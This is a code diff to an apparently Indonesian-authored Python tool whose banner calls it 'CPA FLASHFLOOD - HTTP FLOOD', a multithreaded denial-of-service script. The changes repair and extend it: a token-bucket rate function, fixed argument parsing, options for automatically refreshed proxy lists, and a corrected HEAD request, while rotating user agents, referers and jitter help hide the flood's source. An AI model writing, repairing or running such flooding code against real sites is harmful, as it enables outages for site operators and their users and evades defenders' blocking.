@@ -67,7 +67,7 @@ PROXY_SOURCES = [
 ex = Event()
 rps_limit = 0 # 0 = unlimited
 post_data = None
-rps_tokens = max_threads # buat algoritma token bucket
+rps_tokens = 20 # default value
 last_refill = time.time()
 ips = []
 ref = []
@@ -96,9 +96,8 @@ follow_redirects = True
 retry_count = 0
 retry_delay = 1
 auto_update_proxy = False
-proxy_update_interval = 600  # 10 menit (ubah dari 3600)
+proxy_update_interval = 600  # 10 menit
 last_proxy_update = 0
-
 
 DEFAULT_UA = [
     # Chrome - Windows
@@ -201,6 +200,36 @@ DEFAULT_REF = [
     'https://www.wordpress.com/',
 ]
 
+# Fungsi wait_for_rps_token yang hilang
+def wait_for_rps_token():
+    """Token bucket algorithm for rate limiting"""
+    global rps_tokens, last_refill, rps_limit
+    
+    if rps_limit <= 0:
+        return
+    
+    with lock:
+        now = time.time()
+        elapsed = now - last_refill
+        # Refill tokens
+        rps_tokens = min(rps_tokens + elapsed * rps_limit, rps_limit)
+        last_refill = now
+        
+        if rps_tokens < 1:
+            # Wait for next token
+            wait_time = (1 - rps_tokens) / rps_limit
+            # Release lock while waiting
+            lock.release()
+            time.sleep(wait_time)
+            lock.acquire()
+            # Refill after waiting
+            now = time.time()
+            elapsed = now - last_refill
+            rps_tokens = min(rps_tokens + elapsed * rps_limit, rps_limit)
+            last_refill = now
+        
+        rps_tokens -= 1
+
 def download_proxies():
     """Download proxy list from online sources"""
     global ips, last_proxy_update
@@ -249,7 +278,8 @@ def download_proxies():
 def main(argv):
     global use_proxy, method, custom_headers, use_jitter, jitter_min, jitter_max, save_log
     global max_threads, timeout, request_delay, verify_ssl, follow_redirects
-    global retry_count, retry_delay, auto_update_proxy, proxy_update_interval
+    global retry_count, retry_delay, auto_update_proxy, proxy_update_interval, rps_limit
+    global rps_tokens, post_data
     
     print(BANNER)
     print(f"{Colors.CYAN}🚀 CPA FLASHFLOOD v{__version__} - HTTP FLOOD {Colors.END}")
@@ -260,128 +290,143 @@ def main(argv):
             ['help', 'url=', 'timeout=', 'threads=', 'delay=', 'no-proxy',
              'method=', 'header=', 'jitter=', 'log', 'no-verify',
              'no-redirect', 'retry=', 'retry-delay=', 'rps=', 'data=',
-             'data-file=', 'safe-mode='])
+             'data-file=', 'auto-proxy', 'proxy-interval='])
     except getopt.GetoptError as err:
         print(f"{Colors.RED}✗ Error: {err}{Colors.END}")
         showUsage()
         sys.exit(2)
 
     for opt, arg in opts:
-            if opt in ('-h', '--help'):
-        showUsage()
-        sys.exit(2)
-    elif opt in ('-v', '--url'):
-        url = urllib.parse.unquote(arg)
-    elif opt in ('-t', '--timeout'):
-        try:
-            timeout = int(arg)
-            if timeout < 1:
-                print(f"{Colors.RED}✗ Error: Timeout must be >= 1{Colors.END}")
+        if opt in ('-h', '--help'):
+            showUsage()
+            sys.exit(2)
+        elif opt in ('-v', '--url'):
+            url = urllib.parse.unquote(arg)
+        elif opt in ('-t', '--timeout'):
+            try:
+                timeout = int(arg)
+                if timeout < 1:
+                    print(f"{Colors.RED}✗ Error: Timeout must be >= 1{Colors.END}")
+                    sys.exit(2)
+            except ValueError:
+                print(f"{Colors.RED}✗ Error: Timeout must be integer{Colors.END}")
                 sys.exit(2)
-        except ValueError:
-            print(f"{Colors.RED}✗ Error: Timeout must be integer{Colors.END}")
-            sys.exit(2)
-    elif opt == '--threads':
-        try:
-            max_threads = int(arg)
-            if max_threads < 1 or max_threads > 500:
-                print(f"{Colors.RED}✗ Error: Threads must be between 1-500{Colors.END}")
+        elif opt == '--threads':
+            try:
+                max_threads = int(arg)
+                if max_threads < 1 or max_threads > 500:
+                    print(f"{Colors.RED}✗ Error: Threads must be between 1-500{Colors.END}")
+                    sys.exit(2)
+            except ValueError:
+                print(f"{Colors.RED}✗ Error: Threads must be integer{Colors.END}")
                 sys.exit(2)
-        except ValueError:
-            print(f"{Colors.RED}✗ Error: Threads must be integer{Colors.END}")
-            sys.exit(2)
-    elif opt == '--delay':
-        try:
-            request_delay = float(arg)
-            if request_delay < 0:
-                print(f"{Colors.RED}✗ Error: Delay must be >= 0{Colors.END}")
+        elif opt == '--delay':
+            try:
+                request_delay = float(arg)
+                if request_delay < 0:
+                    print(f"{Colors.RED}✗ Error: Delay must be >= 0{Colors.END}")
+                    sys.exit(2)
+            except ValueError:
+                print(f"{Colors.RED}✗ Error: Delay must be number{Colors.END}")
                 sys.exit(2)
-        except ValueError:
-            print(f"{Colors.RED}✗ Error: Delay must be number{Colors.END}")
-            sys.exit(2)
-    elif opt == '--no-proxy':
-        use_proxy = False
-        print(f"{Colors.YELLOW}⚠️ Proxy disabled{Colors.END}")
-    elif opt in ('--method', '-X'):
-        method = arg.upper()
-        if method not in ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH']:
-            print(f"{Colors.RED}✗ Error: Invalid method{Colors.END}")
-            sys.exit(2)
-        print(f"{Colors.CYAN}ℹ Method: {method}{Colors.END}")
-    elif opt in ('--header', '-H'):
-        try:
-            key, value = arg.split(':', 1)
-            custom_headers[key.strip()] = value.strip()
-            print(f"{Colors.CYAN}ℹ Header: {key.strip()}: {value.strip()}{Colors.END}")
-        except:
-            print(f"{Colors.RED}✗ Error: Invalid header format{Colors.END}")
-            sys.exit(2)
-    elif opt in ('--jitter', '-j'):
-        use_jitter = True
-        try:
-            if ',' in arg:
-                parts = arg.split(',')
-                jitter_min = float(parts[0])
-                jitter_max = float(parts[1])
-            else:
-                base = float(arg)
-                jitter_min = base * 0.5
-                jitter_max = base * 1.5
-            print(f"{Colors.CYAN}ℹ Jitter: {jitter_min:.2f}s - {jitter_max:.2f}s{Colors.END}")
-        except:
-            print(f"{Colors.RED}✗ Error: Invalid jitter format{Colors.END}")
-            sys.exit(2)
-    elif opt in ('--log', '-l'):
-        save_log = True
-        print(f"{Colors.CYAN}ℹ Logging enabled{Colors.END}")
-    elif opt == '--no-verify':
-        verify_ssl = False
-        print(f"{Colors.YELLOW}⚠️ SSL verification disabled{Colors.END}")
-    elif opt == '--no-redirect':
-        follow_redirects = False
-        print(f"{Colors.YELLOW}⚠️ Redirects disabled{Colors.END}")
-    elif opt == '--retry':
-        try:
-            retry_count = int(arg)
-            print(f"{Colors.CYAN}ℹ Retry: {retry_count}{Colors.END}")
-        except:
-            print(f"{Colors.RED}✗ Error: Invalid retry count{Colors.END}")
-            sys.exit(2)
-    elif opt == '--retry-delay':
-        try:
-            retry_delay = float(arg)
-            print(f"{Colors.CYAN}ℹ Retry delay: {retry_delay}s{Colors.END}")
-        except:
-            print(f"{Colors.RED}✗ Error: Invalid retry delay{Colors.END}")
-            sys.exit(2)
-    elif opt == '--rps':
-        try:
-            rps_limit = int(arg)
-            if rps_limit < 1:
-                print(f"{Colors.RED}✗ Error: RPS must be >= 1{Colors.END}")
+        elif opt == '--no-proxy':
+            use_proxy = False
+            print(f"{Colors.YELLOW}⚠️ Proxy disabled{Colors.END}")
+        elif opt in ('--method', '-X'):
+            method = arg.upper()
+            if method not in ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'PATCH']:
+                print(f"{Colors.RED}✗ Error: Invalid method{Colors.END}")
                 sys.exit(2)
-            rps_tokens = rps_limit
-            print(f"{Colors.CYAN}ℹ RPS Limit: {rps_limit}/s{Colors.END}")
-        except:
-            print(f"{Colors.RED}✗ Error: Invalid RPS{Colors.END}")
-            sys.exit(2)
-    elif opt == '--data' or opt == '-d':
-        post_data = arg
-        print(f"{Colors.CYAN}ℹ POST Data: {post_data[:50]}...{Colors.END}")
-    elif opt == '--data-file':
-        try:
-            with open(arg, 'r') as f:
-                post_data = f.read()
-            print(f"{Colors.CYAN}ℹ POST Data loaded from: {arg}{Colors.END}")
-        except:
-            print(f"{Colors.RED}✗ Error: Cannot read file{Colors.END}")
-            sys.exit(2)
+            print(f"{Colors.CYAN}ℹ Method: {method}{Colors.END}")
+        elif opt in ('--header', '-H'):
+            try:
+                key, value = arg.split(':', 1)
+                custom_headers[key.strip()] = value.strip()
+                print(f"{Colors.CYAN}ℹ Header: {key.strip()}: {value.strip()}{Colors.END}")
+            except:
+                print(f"{Colors.RED}✗ Error: Invalid header format{Colors.END}")
+                sys.exit(2)
+        elif opt in ('--jitter', '-j'):
+            use_jitter = True
+            try:
+                if ',' in arg:
+                    parts = arg.split(',')
+                    jitter_min = float(parts[0])
+                    jitter_max = float(parts[1])
+                else:
+                    base = float(arg)
+                    jitter_min = base * 0.5
+                    jitter_max = base * 1.5
+                print(f"{Colors.CYAN}ℹ Jitter: {jitter_min:.2f}s - {jitter_max:.2f}s{Colors.END}")
+            except:
+                print(f"{Colors.RED}✗ Error: Invalid jitter format{Colors.END}")
+                sys.exit(2)
+        elif opt in ('--log', '-l'):
+            save_log = True
+            print(f"{Colors.CYAN}ℹ Logging enabled{Colors.END}")
+        elif opt == '--no-verify':
+            verify_ssl = False
+            print(f"{Colors.YELLOW}⚠️ SSL verification disabled{Colors.END}")
+        elif opt == '--no-redirect':
+            follow_redirects = False
+            print(f"{Colors.YELLOW}⚠️ Redirects disabled{Colors.END}")
+        elif opt == '--retry':
+            try:
+                retry_count = int(arg)
+                print(f"{Colors.CYAN}ℹ Retry: {retry_count}{Colors.END}")
+            except:
+                print(f"{Colors.RED}✗ Error: Invalid retry count{Colors.END}")
+                sys.exit(2)
+        elif opt == '--retry-delay':
+            try:
+                retry_delay = float(arg)
+                print(f"{Colors.CYAN}ℹ Retry delay: {retry_delay}s{Colors.END}")
+            except:
+                print(f"{Colors.RED}✗ Error: Invalid retry delay{Colors.END}")
+                sys.exit(2)
+        elif opt == '--rps':
+            try:
+                rps_limit = int(arg)
+                if rps_limit < 1:
+                    print(f"{Colors.RED}✗ Error: RPS must be >= 1{Colors.END}")
+                    sys.exit(2)
+                rps_tokens = rps_limit
+                print(f"{Colors.CYAN}ℹ RPS Limit: {rps_limit}/s{Colors.END}")
+            except:
+                print(f"{Colors.RED}✗ Error: Invalid RPS{Colors.END}")
+                sys.exit(2)
+        elif opt == '--data' or opt == '-d':
+            post_data = arg
+            print(f"{Colors.CYAN}ℹ POST Data: {post_data[:50]}...{Colors.END}")
+        elif opt == '--data-file':
+            try:
+                with open(arg, 'r') as f:
+                    post_data = f.read()
+                print(f"{Colors.CYAN}ℹ POST Data loaded from: {arg}{Colors.END}")
+            except:
+                print(f"{Colors.RED}✗ Error: Cannot read file{Colors.END}")
+                sys.exit(2)
+        elif opt == '--auto-proxy':
+            auto_update_proxy = True
+            print(f"{Colors.CYAN}ℹ Auto-proxy enabled (update every {proxy_update_interval//60} min){Colors.END}")
+        elif opt == '--proxy-interval':
+            try:
+                proxy_update_interval = int(arg) * 60  # Convert minutes to seconds
+                if proxy_update_interval < 60:
+                    print(f"{Colors.YELLOW}⚠ Minimum interval is 1 minute{Colors.END}")
+                    proxy_update_interval = 60
+                print(f"{Colors.CYAN}ℹ Proxy update interval: {proxy_update_interval//60} minutes{Colors.END}")
+            except:
+                print(f"{Colors.RED}✗ Error: Invalid proxy interval{Colors.END}")
+                sys.exit(2)
 
     if not url:
         print(f"{Colors.RED}✗ Error: URL is required!{Colors.END}")
         showUsage()
         sys.exit(2)
 
+    # Set global URL
+    globals()['url'] = url
     parseFiles()
 
 def parseFiles():
@@ -493,7 +538,7 @@ def request_testing(index):
 
     while not ex.is_set():
         try:
-            wait_for_rps_token() # <--- TAMBAH INI
+            wait_for_rps_token()
             update_proxies_if_needed()
 
             if use_jitter:
@@ -538,7 +583,6 @@ def request_testing(index):
                         'allow_redirects': follow_redirects
                     }
 
-                    # <--- TAMBAH INI BUAT POST DATA
                     if method in ['POST', 'PUT', 'PATCH'] and post_data:
                         req_kwargs['data'] = post_data
                         if 'Content-Type' not in headers:
@@ -549,7 +593,7 @@ def request_testing(index):
                     elif method == 'POST':
                         r = requests.post(url, **req_kwargs)
                     elif method == 'HEAD':
-                        r = requests.head(**req_kwargs)
+                        r = requests.head(url, **req_kwargs)
                     else:
                         r = requests.request(method, url, **req_kwargs)
 
